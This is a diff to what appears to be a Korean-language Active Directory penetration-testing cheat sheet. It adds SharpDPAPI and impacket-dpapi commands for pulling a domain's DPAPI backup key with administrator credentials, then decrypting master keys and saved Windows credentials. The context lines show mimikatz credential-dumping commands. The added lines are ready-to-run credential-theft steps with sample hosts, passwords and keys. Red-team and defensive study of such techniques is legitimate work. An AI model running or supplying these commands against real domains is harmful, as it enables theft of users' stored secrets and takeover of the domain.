@@ -300,6 +300,23 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::credman
 ```
 - 저장된 자격 증명을 열거하고 추출하는 데 사용할 수 있는 다른 도구 : [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) , [LaZagne](https://github.com/AlessandroZ/LaZagne) , [DonPAPI](https://github.com/login-securite/DonPAPI) 등
+```
+# 도메인 백업 키 추출(Windows)
+.\SharpDPAPI.exe backupkey /nowrap
+
+# 자격 증명 복호화(Windows)
+.\SharpDPAPI.exe credentials /pvk:<Backup Key>
+```
+```
+# 도메인 백업 키 추출(Linux)
+impacket-dpapi backupkeys -t contoso.com/Administrator:'Password123!'@192.168.1.11 -dc-ip '192.168.1.11'
+
+# 마스터 키 복호화(Linux)
+impacket-dpapi masterkey -file masterkey -password 'x' -sid 'S-1-5-21-1706474481-3154330266-3610869000-500' -key 'x' -pvk backupkey.pvk
+
+# 자격 증명 복호화(Linux)
+impacket-dpapi credential -file vault -key '0x46cfb8b408aab4ae66ffbbbcf67ac03cfc919587e4ec39b9a936f6c93d92386603bb56b2d861be88495529dd74b23487ab78dcd98a1576b9b30ddc10ed379f2e'
+```
 
 <br/><br/>
 ## Attacking Active Directory & NTDS.dit
